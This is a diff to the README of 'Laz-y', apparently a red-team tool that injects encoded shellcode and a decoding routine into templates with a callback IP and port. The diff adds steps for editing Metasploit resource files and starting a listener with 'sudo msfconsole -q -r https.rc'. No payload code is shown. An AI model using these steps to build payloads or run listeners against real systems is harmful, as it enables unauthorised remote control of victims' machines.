@@ -25,7 +25,8 @@ This script has only been tested on Kali.
 * Add the mark `!!!_SHELLCODE_MARK!!!` in the templates, where you want the shellcode to be injected
 * Add the mark `!!!DECODE_ROUTINE!!!` in the templates, where you want the decoding routine to be injected
 * Run the script with `python3 laz-y.py -l CALLBACK_IP -p CALLBACK_PORT -e ENCODING_OPTION`
-* Edit and import the .rc file in msfconsole
+* Edit the appropriate .rc file with your IP/domain
+* Start your listener with `sudo msfconsole -q -r https.rc`
 
 ![Usage](/images/Usage-screenshot.png)
 
@@ -36,6 +37,7 @@ For research purposes, I dedicated [a repo](https://github.com/Nariod/Laz-y-temp
 - [x] Basic mark for shellcode swaping
 - [x] Add ROT encoding support
 - [x] Force arch when mcs compiles
+- [x] Add msf resource files
 - [ ] Add XOR encoding support
 - [ ] Check user input for safety
 - [ ] Code cleaning and deduplication
